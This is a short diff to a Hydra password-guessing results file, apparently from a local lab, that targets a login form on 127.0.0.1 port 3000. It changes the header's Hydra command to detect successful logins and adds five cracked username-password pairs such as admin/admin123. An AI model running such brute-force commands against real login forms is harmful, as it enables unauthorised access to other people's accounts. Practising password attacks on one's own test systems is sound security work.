@@ -1,1 +1,6 @@
-# Hydra v9.6 run at 2026-06-05 15:13:50 on 127.0.0.1 http-post-form (hydra -L ./users.txt -P ./wordlist.txt -o ./hydra_results.txt -t 4 -w 1 127.0.0.1 http-post-form /login:username=^USER^&password=^PASS^:Senha incorreta:H=Content-Type: application/x-www-form-urlencoded)
+# Hydra v9.6 run at 2026-06-15 17:40:04 on 127.0.0.1 http-post-form (hydra -L ./users.txt -P ./wordlist.txt -s 3000 -t 4 -w 2 -V -o ./hydra_results.txt 127.0.0.1 http-post-form /login:username=^USER^&password=^PASS^:S=Login realizado com sucesso)
+[3000][http-post-form] host: 127.0.0.1   login: admin   password: admin123
+[3000][http-post-form] host: 127.0.0.1   login: joao   password: 123456
+[3000][http-post-form] host: 127.0.0.1   login: maria   password: password
+[3000][http-post-form] host: 127.0.0.1   login: carlos   password: qwerty
+[3000][http-post-form] host: 127.0.0.1   login: ana   password: letmein
